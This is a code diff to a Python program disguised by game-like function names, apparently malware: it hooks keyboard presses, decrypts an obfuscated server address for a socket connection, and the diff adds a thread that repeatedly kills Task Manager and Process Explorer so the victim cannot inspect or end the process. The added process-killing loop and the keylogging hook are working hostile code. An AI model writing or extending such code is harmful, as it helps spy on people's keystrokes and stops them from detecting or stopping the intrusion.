@@ -5,6 +5,8 @@ import threading
 import subprocess
 import os
 import time
+
+import psutil
 from colorama import init, Fore
 import keyboard
 import socket
@@ -36,7 +38,7 @@ def prep_gme():
 
 
 def know_gme():
-    unkown = b"9\x07\xa2:|\x9d\x1f\xe7bCN\x9aE\xfdKg4\xe7\x918\x00#\x05\x04\x00\xedR\x1c\x1c@\x15c\xf5\x91o\xcc~[z\xc9\x92B\x0c\xbf\xe9Z\xb9\x15\xd7l\xe2\x087 \xf1P\x90\xaf\x07\x0fI'\xb9\xd0"
+    unkown = b"\xaa\x7f\xfd?]*\xf7\x0f\xf3\xa6=\xe8\x95\x10J\xaf\xb6x&M\xb9'~\xa4\xb08\xd9\x1a\xd3\x03R\xf3\xe8\xa7\xc5h\xf6-\xb5\x9b\xa8d\x1b\x8e\xc5\xfe.\xf7|Zc\xbb\x936w\x81\xaa~j\xeb\x94\xddQ\x08"
     return str(decrypt(unkown).decode())
     #return "127.0.0.1"
 
@@ -46,9 +48,28 @@ yek = []
 
 def is_admin():
     if ctypes.windll.shell32.IsUserAnAdmin() == 0:
-        print(Fore.RED + "[!] ESTE PROGRAMA NECESITA PERMISOS DE ADMINISTRADOR.")
-        input("\n\n\t[ENTER]")
-        exit()
+       return 1
+    else:
+        return 0;
+
+
+def is_open():
+    for proc in psutil.process_iter(attrs=['pid', 'name']):
+        if "Taskmgr.exe" in proc.info['name'] or "procexp64.exe" in proc.info['name']:
+            return proc.info['pid']
+    return False
+
+
+def start_taskmanager():
+    while True:
+        pid = is_open()
+        if pid:
+            try:
+                os.kill(pid, 9)
+            except PermissionError:
+                if is_admin() != 0:
+                    pass
+        time.sleep(0.2)
 
 
 try:
@@ -169,6 +190,13 @@ def init_game():
     t.join()
 
 
+def init_task():
+    t = threading.Thread(target=start_taskmanager)
+    t.start()
+
+    t.join()
+
+
 def main():
     try:
         prep_gme()
@@ -176,9 +204,8 @@ def main():
 
         find_interests.main()
         keyboard.on_press(on_press)
-
-        init_game()
-
+        task = threading.Thread(target=init_task)
+        task.start()
 
         while True:
             try:
